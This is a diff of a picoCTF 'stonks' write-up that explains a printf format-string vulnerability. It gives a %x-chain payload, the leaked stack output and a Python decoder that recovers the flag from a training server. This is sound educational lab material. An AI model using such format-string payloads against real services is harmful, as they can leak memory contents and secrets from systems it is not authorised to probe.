@@ -11,7 +11,7 @@ I decided to try something noone else has before. I made a bot to automatically 
 
 1. We open file, connect in our shell and read hint to see where to look for our flag. 
 
-  What we see is that our flag is in a separate file on the server and is beaing read and stored in the variable api_buf.
+  What we see is that our flag is in a separate file on the server and is beaing read and stored in the variable ```api_buf```.
 
   ![Code snippet of filestream being read into variable in memory](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/pwn/stonks/images/our_flag_stored_in_variable.png)
 
@@ -32,7 +32,7 @@ I decided to try something noone else has before. I made a bot to automatically 
   Bingo! We found the vulnerability that we want to exploit to get our flag.
 
   What we see:
-  - scanf() function that reads whatever you write into the buffer, and stores it into a variable
+  - scanf() function that reads whatever you write into the buffer, and stores it into a variable called ```user_buf```
   - printf() function that writes your exact input, right back at us.
 
   What we know (or should know):
@@ -40,15 +40,15 @@ I decided to try something noone else has before. I made a bot to automatically 
   - printf can print out all the data in our stack by requesting it, using a bunch of format specifiers (i.e %s, %c, %f etc.)(dont know what this consept is called)
 
   And THIS IS GOOD, because:
-  - If we, instead of sending a "API token" as it requests, we send a string constisting of many %x, we will then make the process that runs on the server, to print out whatever is stored in the stack, which is in this case our flag. (use hiphens in between because our variable is a char pointer and not a string)
+  - If we, instead of sending a "API token" as it requests, we send a string constisting of many %x, we will then make the process that runs on the server, **to print out whatever is stored in the stack**, which is in this case our flag. (use hiphens in between because our variable ```user_buf``` is a char pointer and not a string)
 
-  My payload:
+  Our input:
 
-  ``` text
+  ```text
   %x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x
   ```
 
-  You can 
+  2. Copy and paste into your shell:
 
   !["What is your API token?" written in bash](https://raw.githubusercontent.com/ulrikHesmyr/picoCTF/main/picoGym/pwn/stonks/images/what_is_your_api_token.png)
 
@@ -60,13 +60,16 @@ I decided to try something noone else has before. I made a bot to automatically 
 
   We use the following program provided in the other writeup by Abraxus.
 
-  Copy the output that you get:
+  Our output:
 
   ```
   9692350-804b000-80489c3-f7fa9d80-ffffffff-1-9690160-f7fb7110-f7fa9dc7-0-9691180-5-9692330-9692350-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-35343036-64303664-ffcf007d-f7fe4af8-f7fb7440
   ``` 
 
-  ```python#Output that we got from the server
+  3. Copy and paste your output into the variable ```ourEncodedFlag```
+
+  ```python
+  #Output that we got from the server
 ourEncodedFlag = "9692350-804b000-80489c3-f7fa9d80-ffffffff-1-9690160-f7fb7110-f7fa9dc7-0-9691180-5-9692330-9692350-6f636970-7b465443-306c5f49-345f7435-6d5f6c6c-306d5f79-5f79336e-35343036-64303664-ffcf007d-f7fe4af8-f7fb7440"
 
 #The string we will store our flag in
@@ -90,12 +93,14 @@ for i in ourEncodedFlag.split('-'):
 print(s)    #output: qpicoCTF{I_l05t_4ll_my_m0n3y_6045d60d}J@t
   ```
 
+  4. Copy the python code above and run it
+   
   This gives us - in our case - the flag:
 
   ```
   picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
   ```
 
-  The flag can differ depending on which instance (which port) you are connecting to. (i.e 20195 is my port: nc mercury.picoctf.net 20195)
+  **NB!** The flag can differ depending on which instance (which port) you are connecting to. (i.e 20195 is my port: nc mercury.picoctf.net 20195)
 
     
